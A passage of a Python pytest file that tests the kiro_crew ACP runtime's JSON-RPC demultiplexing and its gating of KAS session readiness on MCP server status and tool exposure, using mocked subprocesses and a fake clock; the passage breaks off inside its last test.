"""Unit tests for the AcpRuntime single-reader demux (Phase 1 multiplexing).

These exercise the routing logic that lets ONE kiro-cli acp process host
multiple concurrent sessions: the single _reader_loop owns stdout and routes
each frame to the right destination —

  - JSON-RPC response whose id is in _pending_requests  → resolve that Future
  - JSON-RPC response whose id is in _routed_requests   → that session's queue
  - notification carrying params.sessionId              → that session's queue
  - request (method + id) with no sessionId             → answered ONCE at
                                                           connection level (-32601)
  - notification with no sessionId                       → broadcast to all
  - empty read (process exit)                            → _mark_dead: fail all
                                                           futures + poison queues

The headline test (`test_multiple_sessions_routed_independently`) proves the
end-to-end claim: two AcpSessionHandle turns run concurrently on one runtime and
each receives only its own session's text + completion.

The reader is driven with a REAL asyncio.StreamReader fed crafted JSON-RPC
lines; the subprocess and stdin are mocked (no kiro-cli is launched).
"""

import asyncio
import gc
import json
import logging
import os
import signal
import sys
import time
import weakref
from pathlib import Path
from unittest.mock import AsyncMock, MagicMock, patch

import pytest
from acp_runtime_helpers import _fast_no_report_ceiling  # noqa: F401
from acp_runtime_helpers import _pinned_kiro_cli_version  # noqa: F401
from acp_runtime_helpers import _stub_sel_for_permission_tests  # noqa: F401
from acp_runtime_helpers import (
    _await_pending,
    _await_routed,
    _bounded,
    _feed,
    _make_runtime,
    _next,
    _permission_msg,
    _register,
    _replying_send,
    _spawn_client_mod,
    _start_reader,
    _stop_reader,
)
from spawn_test_helpers import strip_spawn_shim

from kiro_crew.acp import runtime as runtime_mod
from kiro_crew.acp.client import _OVERSIZE_DRAIN_MAX_BYTES
from kiro_crew.acp.harness import SessionExtras
from kiro_crew.acp.runtime import (
    _TERMINATE_TIMEOUT,
    AcpRuntime,
    AcpRuntimeDead,
    AcpRuntimeError,
    AcpSessionHandle,
    _ColdStartAdmission,
)
from kiro_crew.acp.types import (
    ACP_BACKEND_KAS,
    ACP_BACKEND_KIRO,
    EVENT_COMPLETE,
    EVENT_TEXT_CHUNK,
    JSONRPC_METHOD_NOT_FOUND,
    METHOD_COMMANDS_EXECUTE,
    METHOD_MCP_OAUTH_REQUEST,
    METHOD_SESSION_LOAD,
    METHOD_SESSION_NEW,
    METHOD_SESSION_TERMINATE,
    METHOD_SESSION_UPDATE,
    METHOD_SET_CONFIG_OPTION,
    METHOD_SET_MODE,
    JsonRpcMessage,
)
from kiro_crew.mcp_cleanup import KIROCREW_BIN_MCP_SERVERS
from kiro_crew.mcp_gateway.claim import STUB_SESSION_TOKEN_ENV
from kiro_crew.start_priority import StartPriority
from kiro_crew.testing.wait import await_until, default_timeout

# ── Harness ──


@pytest.fixture
def kas_readiness_wire(monkeypatch, tmp_path):
    """Real demux and session startup; only the subprocess and clock are fake.

    The fake stdout is a ``_RunningLoopStreamReader`` (see ``_make_runtime``): a
    StreamReader that binds its loop lazily, the first time a read suspends, so it
    picks up the loop pytest-asyncio runs the test on rather than the synchronous
    fixture-setup loop. Any consumer of ``rt._process.stdout`` gets a correctly-
    bound reader, not only tests that start it through ``_start_reader``.
    """
    from types import SimpleNamespace

    import kiro_crew.acp.runtime as runtime_mod
    import kiro_crew.acp.session_handle as sh

    rt, reader, proc = _make_runtime()
    rt._acp_backend = ACP_BACKEND_KAS
    rt._can_load_session = True
    rt._work_dir = tmp_path
    clock = [0.0]
    monkeypatch.setattr(sh, "time", SimpleNamespace(time=time.time, monotonic=lambda: clock[0]))
    monkeypatch.setattr(rt, "_session_start_budget", AsyncMock(return_value=30.0))
    monkeypatch.setattr(
        rt,
        "_kas_custom_agents",
        AsyncMock(
            return_value=SessionExtras(
                custom_agents=[
                    {
                        "id": "worker",
                        "tools": ["@kirocrew-core", "@kirocrew-dashboard"],
                        "mcpServers": {"kirocrew-core": {}, "external": {}},
                    },
                    {"id": "inactive", "mcpServers": {"kirocrew-work": {}}},
                ]
            )
        ),
    )
    sent = asyncio.Queue()
    reads = asyncio.Queue()
    proc.stdin.write.side_effect = lambda raw: sent.put_nowait(json.loads(raw))
    original_init = AcpSessionHandle.__init__

    def observe_queue(self, *args, **kwargs):
        original_init(self, *args, **kwargs)
        get = self._queue.get

        async def observed_get():
            reads.put_nowait(None)
            return await get()

        monkeypatch.setattr(self._queue, "get", observed_get)

    monkeypatch.setattr(AcpSessionHandle, "__init__", observe_queue)

    async def take(queue):
        return await _next(queue, what="the next frame on the wire")

    def status(
        state="connecting", sid="ready-session", *, origin="client", extra_servers=(), **extra
    ):
        # ``origin=None`` reproduces the captured kiro-cli 2.18.0 wire: no
        # ``_meta`` on ANY entry, not a foreign origin on one of them.
        meta = (
            {}
            if origin is None
            else {"_meta": {"kiro": {"resource": {"source": {"origin": origin}}}}}
        )
        _feed(
            reader,
            {
                "method": "_kiro/mcp/status",
                "params": {
                    "sessionId": sid,
                    "servers": [
                        {"name": "kirocrew-core", "status": state, **meta, **extra},
                        {"name": "kirocrew-dashboard", "status": "connected", **meta},
                        {"name": "external", "status": "failed", "errorMessage": "irrelevant"},
                        *({"name": name, "status": "connected", **meta} for name in extra_servers),
                    ],
                },
            },
        )

    def tags(*names, sid="ready-session"):
        _feed(
            reader,
            {
                "method": "_kiro/tools/didChange",
                "params": {
                    "sessionId": sid,
                    "tags": [{"source": "mcp", "tag": f"@{name}/some_tool"} for name in names],
                },
            },
        )

    async def handshake(
        resume,
        *,
        switch=True,
        pre_ready=False,
        pre_frames=(),
        injected=None,
        session_key="",
        agent_name="worker",
    ):
        kwargs = {"cwd": tmp_path, "agent": agent_name, "session_key": session_key}
        servers = injected if injected is not None else [{"name": "kirocrew-dashboard"}]
        if resume:
            # Load gets the session injection through the existing overlay seam.
            # ``**_kw``: the real signature takes the session's checkout as
            # ``work_dir``, and a double that refuses it makes ``load_session``
            # raise before it ever reaches the wire, so every assertion below
            # fails as a handshake timeout instead of naming the double.
            monkeypatch.setattr(
                runtime_mod,
                "pooled_session_servers",
                lambda *_, **_kw: servers,
            )
            start = rt.load_session("", "ready-session", **kwargs)
        else:
            start = rt.create_session(mcp_servers=servers, **kwargs)
        task = asyncio.create_task(start)
        request = await take(sent)
        assert request["method"] == (METHOD_SESSION_LOAD if resume else METHOD_SESSION_NEW)
        # The projection reaches the wire with the ACTIVE agent's hoistable
        # managed declarations carried in the session-level array instead of the
        # block (``hoist_managed_servers``); everything else is byte-identical.
        projection = rt._kas_custom_agents.return_value.custom_agents
        sent_agents = request["params"]["_meta"]["kiro"]["customAgents"]
        assert len(sent_agents) == len(projection)
        wire_names = [entry["name"] for entry in request["params"]["mcpServers"]]
        assert len(wire_names) == len(set(wire_names)), "a name must appear once on the wire"
        for sent_agent, projected in zip(sent_agents, projection):
            hoisted = {
                name
                for name, entry in (projected.get("mcpServers") or {}).items()
                if projected.get("id") == agent_name
                and name in KIROCREW_BIN_MCP_SERVERS
                and isinstance(entry.get("command"), str)
                and entry.get("command")
                and name not in {e["name"] for e in servers}
            }
            expected = dict(projected)
            kept = {
                k: v for k, v in (projected.get("mcpServers") or {}).items() if k not in hoisted
            }
            if kept:
                expected["mcpServers"] = kept
            else:
                expected.pop("mcpServers", None)
            assert sent_agent == expected
            for name in hoisted:
                assert name in wire_names
                element = next(e for e in request["params"]["mcpServers"] if e["name"] == name)
                assert element["type"] == "stdio"
                # The resume path owns its array, so its session token rides on
                # the hoisted element; create_session is handed an explicit array
                # here, which mints none.
                tokens = [pair for pair in element["env"] if pair["name"] == STUB_SESSION_TOKEN_ENV]
                assert len(tokens) == (1 if resume else 0) and all(p["value"] for p in tokens)
                declared_env = [
                    {"name": k, "value": str(v)}
                    for k, v in (projected["mcpServers"][name].get("env") or {}).items()
                ]
                if not tokens:
                    assert element["command"] == projected["mcpServers"][name]["command"]
                    assert element["env"] == declared_env
                    continue
                # A tokened element launches the managed invocation, never the
                # spec's (KAS spawns it; gatewayd's own-binary check never runs).
                from kiro_crew.agent import _managed_mcp_env, managed_mcp_spec_entry

                managed = managed_mcp_spec_entry(name, include_opt_in=True)
                assert element["command"] == managed["command"]
                assert element["args"] == [str(a) for a in managed.get("args", [])]
                assert [p for p in element["env"] if p not in tokens] == [
                    p
                    for p in declared_env
                    if p["name"] in ("KIROCREW_PORT", "KIROCREW_SESSION_KEY")
                ] + [{"name": k, "value": v} for k, v in _managed_mcp_env().items()]
        if pre_ready:
            status("connected")
            tags("kirocrew-core", "kirocrew-dashboard")
        for frame in pre_frames:
            _feed(reader, frame)
        _feed(
            reader,
            {
                "id": request["id"],
                "result": {
                    "sessionId": "ready-session",
                    "modes": {
                        "currentModeId": "before" if switch else agent_name,
                        "availableModes": [{"id": agent_name}],
                    },
                },
            },
        )
        mode = await take(sent)
        assert mode["method"] == METHOD_SET_MODE
        _feed(reader, {"id": mode["id"], "result": {}})
        return task

    return SimpleNamespace(
        runtime=rt,
        reader=reader,
        sent=sent,
        reads=reads,
        take=take,
        clock=clock,
        status=status,
        tags=tags,
        handshake=handshake,
    )


@pytest.mark.asyncio
async def test_kas_readiness_wire_stdout_reads_on_the_running_loop(kas_readiness_wire):
    """A consumer that reads ``rt._process.stdout`` directly must not hit the
    cross-loop error the fixture once needed ``_start_reader`` to paper over.

    A plain ``StreamReader`` pins its loop at construction, so one built on a
    synchronous fixture-setup loop would create its ``readuntil`` waiter on that
    loop and, from a test running on a different loop, raise ``RuntimeError: got
    Future attached to a different loop``. The fixture's reader binds its loop
    lazily on the first suspending read, so it picks up the running loop for any
    consumer -- including this one, which drives stdout directly without going
    through ``_start_reader``. The read must suspend (partial data, no delimiter
    yet) to create that waiter; a line already complete in the buffer returns
    without one and would not exercise the bug.
    """
    wire = kas_readiness_wire
    stdout = wire.runtime._process.stdout
    assert isinstance(stdout, asyncio.StreamReader)
    # Feed a partial line so readuntil must suspend and create its waiter on the
    # reader's bound loop; complete the line from a task on the running loop. The
    # read is bounded by ``default_timeout()`` (half the test's budget, >= the
    # wait-discipline floor) so a wrong-loop regression fails this test by name
    # instead of hanging into the runner's worker-killing timeout (rule D8).
    stdout.feed_data(b'{"ok": tr')

    async def _complete() -> None:
        await asyncio.sleep(0)
        stdout.feed_data(b"ue}\n")

    completer = asyncio.ensure_future(_complete())
    try:
        line = await asyncio.wait_for(stdout.readuntil(b"\n"), timeout=default_timeout())
    finally:
        completer.cancel()
        await asyncio.gather(completer, return_exceptions=True)
    assert json.loads(line) == {"ok": True}


@pytest.mark.asyncio
@pytest.mark.parametrize("resume", [False, True], ids=["new", "load"])
@pytest.mark.parametrize("revoked", [False, True], ids=["valid", "revoked"])
async def test_derived_worker_identity_keeps_freshness_and_readiness(
    kas_readiness_wire, monkeypatch, tmp_path, resume, revoked
):
    from kiro_crew import agent, agent_state
    from kiro_crew.acp.harness import harness_for
    from kiro_crew.config import paths as paths_mod

    agents_dir = tmp_path / "agents"
    agents_dir.mkdir()
    monkeypatch.setattr(agent, "kiro_agents_dir_path", lambda: agents_dir)
    # Redirect through the override: ``acp.skill_projection`` is first imported
    # inside this test and binds ``kiro_agents_dir`` by name, so the redirect must
    # live in a value that function reads on every call.
    monkeypatch.setattr(paths_mod, "_agents_dir_override", lambda: agents_dir)
    monkeypatch.setattr(agent_state, "config_dir", lambda: tmp_path / "derived-state")
    default = agents_dir / "kirocrew.json"
    spec = {
        "name": "kirocrew",
        "prompt": "Complete the assigned work.",
        "tools": ["@kirocrew-core"],
        "mcpServers": {"kirocrew-core": {"command": "unused"}},
    }
    default.write_text(json.dumps(spec), encoding="utf-8")
    await asyncio.to_thread(agent._install_worker_agent)
    key = "subagent:derived-worker"
    extras = await harness_for(ACP_BACKEND_KAS).session_extras(
        "kirocrew-worker", work_dir=tmp_path, session_key=key
    )
    assert extras.derived_spec_snapshot is not None
    for server in ("kirocrew-core", "kirocrew-work"):
        assert extras.custom_agents[0]["mcpServers"][server]["env"]["KIROCREW_SESSION_KEY"] == key
    wire = kas_readiness_wire
    monkeypatch.setattr(wire.runtime, "_kas_custom_agents", AsyncMock(return_value=extras))
    terminate = AsyncMock()
    monkeypatch.setattr(wire.runtime, "terminate_session", terminate)
    if revoked:
        # The host will receive the old payload. Ready MCP reports must not
        # authorize it after the owner's source grants have changed.
        spec["mcpServers"] = {}
        default.write_text(json.dumps(spec), encoding="utf-8")

    reader_task = await _start_reader(wire.runtime)
    start = None
    try:
        start = await wire.handshake(
            resume,
            pre_ready=revoked,
            injected=[],
            session_key=key,
            agent_name="kirocrew-worker",
        )
        wire.runtime._kas_custom_agents.assert_awaited_once_with(
            "kirocrew-worker", member_dispatch=False, crew_panel=False, session_key=key
        )
        if revoked:
            wire.status("connected", extra_servers=("kirocrew-work",))
            wire.tags("kirocrew-core", "kirocrew-work")
            with pytest.raises(AcpRuntimeError, match="changed during worker load"):
                await await_until(start, what="the session start")
            terminate.assert_awaited_once_with("ready-session")
        else:
            await wire.take(wire.reads)
            wire.clock[0] = 7.0
            wire.status()
            await wire.take(wire.reads)
            assert not start.done()
            wire.status("connected", extra_servers=("kirocrew-work",))
            await wire.take(wire.reads)
            assert not start.done(), "a fresh template still needs actual tool exposure"
            wire.tags("kirocrew-core", "kirocrew-work")
            await await_until(start, what="the session start")
            terminate.assert_not_awaited()
        assert wire.sent.empty(), "startup must not issue a prompt"
    finally:
        if start is not None:
            if not start.done():
                start.cancel()
            await asyncio.gather(start, return_exceptions=True)
        reader_task.cancel()
        await asyncio.gather(reader_task, return_exceptions=True)


@pytest.mark.asyncio
@pytest.mark.parametrize("resume", [False, True], ids=["new", "load"])
async def test_session_cwd_is_bound_through_real_create_and_load(
    kas_readiness_wire, monkeypatch, tmp_path, resume
):
    """The directory a session opens against must survive to the PUBLIC provider cwd.

    This drives the REAL ``create_session``/``load_session`` wire path (not a
    hand-set ``handle._bound_cwd``), so it pins the wiring the unit tests cannot:
    ``runtime.py`` records ``bound_cwd=str(session_work_dir)`` on create and
    ``bound_cwd=str(load_params["cwd"])`` on load. Reverting either line makes
    the handle's ``_bound_cwd`` fall back to ``""`` and both assertions below
    fail. The runtime's ``_work_dir`` is repointed at a sibling directory while
    the session opens against ``tmp_path`` (a different directory), which is the
    shared-runtime case bolichen97's review is about: on a shared runtime,
    answering reuse validation with the runtime's own directory would evict a
    live session that bound elsewhere.

    It also pins the SessionMap/resume-caller flow end to end: the inner
    ``AcpSessionProvider.cwd`` must report the bound dir, AND the ``AcpProvider``
    wrapper that every caller actually holds must forward it rather than
    returning ``self._client._work_dir``.
    """
    from kiro_crew.acp.session_provider import AcpSessionProvider
    from kiro_crew.providers.acp import AcpProvider

    wire = kas_readiness_wire
    # The fixture starts the runtime in tmp_path and the session also opens
    # against tmp_path. Repoint the runtime's _work_dir at a DIFFERENT directory
    # so the two genuinely diverge -- the shared-runtime case: a runtime started
    # in A hosting a session that bound to B. If cwd leaked the runtime's dir,
    # the assertions below would read A, not the session's B (tmp_path).
    runtime_work_dir = tmp_path / "runtime-elsewhere"
    runtime_work_dir.mkdir()
    wire.runtime._work_dir = runtime_work_dir
    assert str(wire.runtime._work_dir) != str(tmp_path)

    # ``_bound_cwd`` is recorded synchronously when ``create_session`` /
    # ``load_session`` constructs the handle, well before the session reaches
    # readiness. Capture the handle at construction rather than driving the full
    # readiness dance -- the wiring under test is the construction argument.
    captured: list[AcpSessionHandle] = []
    constructed = AcpSessionHandle.__init__

    def capture_init(self, *args, **kwargs):
        constructed(self, *args, **kwargs)
        captured.append(self)

    monkeypatch.setattr(AcpSessionHandle, "__init__", capture_init)

    reader_task = await _start_reader(wire.runtime)
    start = None
    try:
        start = await wire.handshake(resume, pre_ready=True)
        # Let the handshake get as far as constructing the handle (session/new or
        # session/load has returned; the handle is built right after).
        for _ in range(20):
            if captured:
                break
            await asyncio.sleep(0)
        assert captured, "the real create/load path never constructed a handle"
        handle = captured[-1]

        # The wiring recorded the session's own directory, not the runtime's.
        assert handle._bound_cwd == str(tmp_path)

        # The inner provider reads the bound dir off the handle.
        inner = AcpSessionProvider(handle, wire.runtime)
        assert inner.cwd == str(tmp_path)

        # The wrapper every SessionMap/resume caller holds forwards the SAME
        # bound dir, not the shared runtime's _work_dir.
        wrapper = AcpProvider.__new__(AcpProvider)
        wrapper._client = inner
        assert wrapper.cwd == str(tmp_path)
    finally:
        if start is not None:
            if not start.done():
                start.cancel()
            await asyncio.gather(start, return_exceptions=True)
        reader_task.cancel()
        await asyncio.gather(reader_task, return_exceptions=True)


@pytest.mark.asyncio
@pytest.mark.parametrize("resume", [False, True], ids=["new", "load"])
@pytest.mark.parametrize("pre_ready", [False, True], ids=["cold", "stale-mode"])
async def test_kas_readiness_delays_prompt_until_active_managed_tools(
    kas_readiness_wire, monkeypatch, resume, pre_ready
):
    """The first prompt cannot race core when startup takes more than six seconds."""
    import kiro_crew.acp.session_handle as sh

    monkeypatch.setattr(sh, "_MCP_DRAIN_NO_REPORT_CEILING", 6.0)
    wire = kas_readiness_wire
    reader_task = await _start_reader(wire.runtime)
    start = None
    try:
        start = await wire.handshake(
            resume, pre_ready=pre_ready, session_key="subagent:readiness-worker"
        )
        wire.runtime._kas_custom_agents.assert_awaited_once_with(
            "worker",
            member_dispatch=False,
            crew_panel=False,
            session_key="subagent:readiness-worker",
        )
        # Two pre-mode snapshots must be consumed without satisfying this activation.
        for _ in range(3 if pre_ready else 1):
            await wire.take(wire.reads)
        wire.clock[0] = 7.0
        wire.status()
        await wire.take(wire.reads)
        assert not start.done()
        assert wire.sent.empty()

        wire.status("connected", sid="other-session")
        wire.tags("kirocrew-core", "kirocrew-dashboard", sid="other-session")
        wire.status("connected", sid=None)
        wire.tags("kirocrew-core", "kirocrew-dashboard", sid=None)
        wire.status("connected", origin="global")
        wire.tags("kirocrew-dashboard")
        for _ in range(3):
            await wire.take(wire.reads)
        await wire.take(wire.reads)
        assert not start.done()

        wire.status("connected")
        await wire.take(wire.reads)
        assert not start.done(), "Connected transport alone does not establish tool exposure"
        wire.tags("kirocrew-core", "kirocrew-dashboard")
        handle = await await_until(start, what="the session start")
        assert wire.sent.empty()

        async def collect():
            return [event async for event in handle.prompt("ready")]

        turn = asyncio.create_task(collect())
        try:
            request = await wire.take(wire.sent)
            assert request["method"] == "session/prompt"
            _feed(wire.reader, {"id": request["id"], "result": {"stopReason": "end_turn"}})
            await await_until(turn, what="the turn finishing")
            assert wire.sent.empty()
        finally:
            if not turn.done():
                turn.cancel()
            await asyncio.gather(turn, return_exceptions=True)
    finally:
        if start is not None and not start.done():
            start.cancel()
        if start is not None:
            await asyncio.gather(start, return_exceptions=True)
        await _stop_reader(reader_task)


@pytest.mark.asyncio
@pytest.mark.parametrize("resume", [False, True], ids=["new", "load"])
@pytest.mark.parametrize(
    "state",
    [
        "failed",
        "disabled",
        "authorization",
        "timeout",
        "unreported",
        "missing-catalog",
        "legacy-provenance",
    ],
)
async def test_kas_readiness_refuses_failure_or_missing_report(kas_readiness_wire, resume, state):
    from kiro_crew.acp.session_handle import AcpRequestTimeout

    wire = kas_readiness_wire
    reader_task = await _start_reader(wire.runtime)
    start = None
    try:
        start = await wire.handshake(resume)
        await wire.take(wire.reads)
        if state in ("timeout", "missing-catalog"):
            wire.clock[0] = 31.0
            wire.status("connected" if state == "missing-catalog" else "connecting")
        elif state == "unreported":
            wire.clock[0] = 31.0
            _feed(
                wire.reader, {"method": "session/update", "params": {"sessionId": "ready-session"}}
            )
        elif state == "authorization":
            wire.status(
                "connecting", failedAuthorization=True, errorMessage="authorization required"
            )
        elif state == "legacy-provenance":
            # Captured kiro-cli 2.18.0: connected with a catalog, tag to follow,
            # no origin anywhere. ``kirocrew-core`` reached the backend only via
            # the agent block (the fixture injects just ``kirocrew-dashboard``),
            # so it is refused before the timeout, naming the limit.
            wire.status("connected", origin=None, tools=[{"name": "ping", "disabled": False}])
            wire.tags("kirocrew-core", "kirocrew-dashboard")
        else:
            wire.status(state, errorMessage="managed test failure")
        expected = (
            AcpRequestTimeout
            if state in ("timeout", "unreported", "missing-catalog")
            else AcpRuntimeError
        )
        if not resume:
            deletion = await wire.take(wire.sent)
            assert deletion["method"] == "_kiro/session/delete"
            assert deletion["params"] == {"sessionId": "ready-session"}
            _feed(wire.reader, {"id": deletion["id"], "result": {}})
        with pytest.raises(expected, match="kirocrew-core") as raised:
            await await_until(start, what="the session start")
        if state == "legacy-provenance":
            assert "connected without provenance" in str(raised.value)
            assert "reports no MCP server origin" in str(raised.value)
        assert wire.sent.empty(), "A failed startup must not prompt or delete a retained session"
        assert "ready-session" not in wire.runtime._session_queues
    finally:
        if start is not None and not start.done():
            start.cancel()
        if start is not None:
            await asyncio.gather(start, return_exceptions=True)
        await _stop_reader(reader_task)


@pytest.mark.asyncio
@pytest.mark.parametrize("resume", [False, True], ids=["new", "load"])
async def test_kas_readiness_accepts_provenance_less_wire_for_injected_servers(
    kas_readiness_wire, resume
):
    """Captured kiro-cli 2.18.0 (``2.18.0-newload-global+session.json``): a
    session-level injection connects as the session's own server on new and
    load with no ``_meta`` anywhere. Injected names are therefore trusted on a
    provenance-less snapshot; connection plus tag exposure is still required.
    """
    wire = kas_readiness_wire
    reader_task = await _start_reader(wire.runtime)
    start = None
    try:
        start = await wire.handshake(
            resume, injected=[{"name": "kirocrew-core"}, {"name": "kirocrew-dashboard"}]
        )
        await wire.take(wire.reads)
        wire.status("connecting", origin=None)
        await wire.take(wire.reads)
        assert not start.done()
        wire.status("connected", origin=None, tools=[{"name": "ping", "disabled": False}])
        await wire.take(wire.reads)
        assert not start.done(), "Connected transport alone does not establish tool exposure"
        wire.tags("kirocrew-core", "kirocrew-dashboard")
        handle = await await_until(start, what="the session start")
        assert set(handle.mcp_session_report().payload()["ready"]) == {
            "kirocrew-core",
            "kirocrew-dashboard",
        }
        assert wire.sent.empty(), "startup must not issue a prompt"
    finally:
        if start is not None and not start.done():
            start.cancel()
        if start is not None:
            await asyncio.gather(start, return_exceptions=True)
        await _stop_reader(reader_task)


@pytest.mark.asyncio
@pytest.mark.parametrize("resume", [False, True], ids=["new", "load"])
@pytest.mark.parametrize("catalog", [True, False], ids=["catalog", "no-catalog"])
async def test_kas_default_managed_core_is_hoisted_and_ready_on_provenance_less_wire(
    kas_readiness_wire, monkeypatch, resume, catalog
):
    """The ordinary install: ``kirocrew-core`` declared only by the agent spec,
    nothing stubbed. The runtime carries the projected declaration in the
    session-level array (``2.18.0-payload-probe.json``: that payload connects
    Crew's own server past colliding global and workspace entries on new and
    load), so the provenance-less wire reads it as injected and startup completes.
    Exposure comes from the connected entry's own catalog when it carries one
    (2.18.0 through 2.22.0 all do), and only otherwise from a tag frame.
    """
    from kiro_crew.acp.kas_agents import to_client_custom_agent

    wire = kas_readiness_wire
    projected = to_client_custom_agent(
        "worker",
        {
            "tools": ["@kirocrew-core"],
            "allowedTools": [],
            "mcpServers": {"kirocrew-core": {"command": "kirocrew", "args": ["mcp"]}},
        },
        "Test worker",
        session_key="subagent:default-worker",
    )
    monkeypatch.setattr(
        wire.runtime,
        "_kas_custom_agents",
        AsyncMock(return_value=SessionExtras(custom_agents=[projected])),
    )
    reader_task = await _start_reader(wire.runtime)
    start = None
    try:
        start = await wire.handshake(resume, session_key="subagent:default-worker")
        sent = wire.runtime._kas_custom_agents.call_args
        assert sent.kwargs["session_key"] == "subagent:default-worker"
        await wire.take(wire.reads)
        if catalog:
            wire.status("connected", origin=None, tools=[{"name": "ping", "disabled": False}])
        else:
            wire.status("connected", origin=None)
            await wire.take(wire.reads)
            assert not start.done(), "exposure is still required for an injected server"
            wire.tags("kirocrew-core", "kirocrew-dashboard")
        handle = await await_until(start, what="the session start")
        assert set(handle.mcp_session_report().payload()["ready"]) == {
            "kirocrew-core",
            "kirocrew-dashboard",
        }
        assert set(handle.mcp_session_report().payload()["configured"]) == {
            "kirocrew-core",
            "kirocrew-dashboard",
        }
        assert wire.sent.empty(), "startup must not issue a prompt"
    finally:
        if start is not None and not start.done():
            start.cancel()
        if start is not None:
            await asyncio.gather(start, return_exceptions=True)
        await _stop_reader(reader_task)


@pytest.mark.asyncio
@pytest.mark.parametrize("resume", [False, True], ids=["new", "load"])
async def test_kas_readiness_accepts_pre_response_reports_for_unchanged_mode(
    kas_readiness_wire, resume
):
    wire = kas_readiness_wire
    reader_task = await _start_reader(wire.runtime)
    start = None
    try:
        start = await wire.handshake(resume, switch=False, pre_ready=True)
        handle = await await_until(start, what="the session start")
        report = handle.mcp_session_report().payload()
        assert set(report["ready"]) == {"kirocrew-core", "kirocrew-dashboard"}
        assert wire.sent.empty()
    finally:
        if start is not None and not start.done():
            start.cancel()
        if start is not None:
            await asyncio.gather(start, return_exceptions=True)
        await _stop_reader(reader_task)


@pytest.mark.asyncio
@pytest.mark.parametrize("resume", [False, True], ids=["new", "load"])
@pytest.mark.parametrize(
    "tools,excluded,catalog_state",
    [
        (["read"], [], "enabled"),
        (["*"], ["@kirocrew-core"], "enabled"),
        (["@kirocrew-core/memory_recall"], ["@kirocrew-core/memory_recall"], "enabled"),
        (["@kirocrew-core/memory_recall"], ["@kirocrew-core/memory_recall"], "empty"),
        (
            ["@kirocrew-core"],
            ["@kirocrew-core/memory_recall", "@kirocrew-core/learn_add"],
            "enabled",
        ),
        (["@kirocrew-core/memory_recall"], [], "disabled"),
        (["*"], [], "disabled"),
        (["@kirocrew-core"], ["@kirocrew-core/learn_add"], "enabled"),
    ],
    ids=[
        "no-server-grant",
        "excluded-server",
        "excluded-selected-tool",
        "excluded-selected-tool-empty-catalog",
        "excluded-all-tools",
        "disabled-selected-tool",
        "disabled-all-tools",
        "unapproved-recall-exposed-by-catalog",
    ],
)
async def test_kas_readiness_respects_projected_tool_restrictions(
    kas_readiness_wire, monkeypatch, resume, tools, excluded, catalog_state
):
    """A declared server with intentionally hidden tools must still connect.

    The last case is the one with an exposed tool: its connected catalog is the
    exposure evidence, so no tag frame is needed (none arrives on 2.22.0).
    """
    from kiro_crew.acp.kas_agents import to_client_custom_agent

    wire = kas_readiness_wire
    projected = to_client_custom_agent(
        "worker",
        {
            "tools": tools,
            "excludedTools": excluded,
            "allowedTools": [],
            "mcpServers": {"kirocrew-core": {"command": "unused-test-mcp"}},
        },
        "Test worker",
        member_dispatch=True,
    )
    original = json.loads(json.dumps(projected))
    monkeypatch.setattr(
        wire.runtime,
        "_kas_custom_agents",
        AsyncMock(return_value=SessionExtras(custom_agents=[projected])),
    )
    reader_task = await _start_reader(wire.runtime)
    start = None
    catalog = [
        {"name": name, "disabled": catalog_state == "disabled"}
        for name in ("memory_recall", "learn_add")
        if catalog_state != "empty"
    ]
    try:
        start = await wire.handshake(resume)
        await wire.take(wire.reads)
        wire.status("connecting", tools=[])
        wire.tags("kirocrew-dashboard")
        for _ in range(2):
            await wire.take(wire.reads)
        assert not start.done(), "A restricted tool policy does not waive connection readiness"
        wire.status("connected", tools=catalog)
        handle = await await_until(start, what="the session start")
        assert set(handle.mcp_session_report().payload()["ready"]) == {
            "kirocrew-core",
            "kirocrew-dashboard",
        }
        assert projected == original, "Readiness must not change the projected grants"
        assert wire.sent.empty()
    finally:
        if start is not None and not start.done():
            start.cancel()
        if start is not None:
            await asyncio.gather(start, return_exceptions=True)
        await _stop_reader(reader_task)


@pytest.mark.asyncio
@pytest.mark.parametrize("resume", [False, True], ids=["new", "load"])
@pytest.mark.parametrize("managed", [False, True], ids=["external-only", "managed-and-external"])
async def test_kas_readiness_preserves_external_init_side_effects(
    kas_readiness_wire, monkeypatch, caplog, resume, managed
):
    """OAuth/config/failure information survives without gating managed readiness."""
    wire = kas_readiness_wire
    oauth = {
        "method": METHOD_MCP_OAUTH_REQUEST,
        "params": {
            "sessionId": "ready-session",
            "serverName": "external-auth",
            "oauthUrl": "https://example.com/authorize",
        },
    }
    if not managed:
        monkeypatch.setattr(
            wire.runtime,
            "_kas_custom_agents",
            AsyncMock(
                return_value=SessionExtras(
                    custom_agents=[{"id": "worker", "mcpServers": {"external-auth": {}}}]
                )
            ),
        )
    reader_task = await _start_reader(wire.runtime)
    start = None
    caplog.set_level("INFO", logger="kiro_crew.acp.session_handle")
    try:
        start = await wire.handshake(resume, pre_frames=[oauth], injected=None if managed else [])
        # The pre-mode OAuth frame is still captured; it cannot arm readiness.
        for _ in range(2):
            await wire.take(wire.reads)
        cfg = [{"id": "effort", "options": ["low", "high"]}]
        _feed(wire.reader, oauth)  # duplicated notifications stay deduplicated
        _feed(
            wire.reader,
            {
                "method": METHOD_SESSION_UPDATE,
                "params": {
                    "sessionId": "ready-session",
                    "update": {"sessionUpdate": "config_option_update", "configOptions": cfg},
                },
            },
        )
        _feed(
            wire.reader,
            {
                "method": "_kiro.dev/mcp/server_init_failure",
                "params": {
                    "sessionId": "ready-session",
                    "serverName": "external-failed",
                    "error": "external initialization failed",
                },
            },
        )
        if managed:
            for _ in range(3):
                await wire.take(wire.reads)
            assert not start.done()
            wire.status("connected")
            wire.tags("kirocrew-core", "kirocrew-dashboard")
        handle = await await_until(start, what="the session start")
        assert handle._config_options == cfg
        assert handle.pop_pending_oauth_requests() == [
            {"serverName": "external-auth", "oauthUrl": "https://example.com/authorize"}
        ]
        assert handle.pop_pending_oauth_requests() == []
        assert "external-failed" in handle.mcp_session_report().payload()["failed"]
        assert "MCP server init failure on ready-session: external-failed" in caplog.text
        assert wire.sent.empty()
    finally:
        if start is not None and not start.done():
            start.cancel()
        if start is not None:
            await asyncio.gather(start, return_exceptions=True)
        await _stop_reader(reader_task)


@pytest.mark.asyncio
@pytest.mark.parametrize("resume", [False, True], ids=["new", "load"])
async def test_managed_readiness_keeps_external_wire_roster(kas_readiness_wire, resume):
    wire = kas_readiness_wire
    reader_task = await _start_reader(wire.runtime)
    start = None
    try:
        start = await wire.handshake(
            resume,
            injected=[
                {"name": "kirocrew-core"},
                {"name": "kirocrew-dashboard"},
                {"name": "external"},
            ],
        )
        await wire.take(wire.reads)
        wire.status("connected")
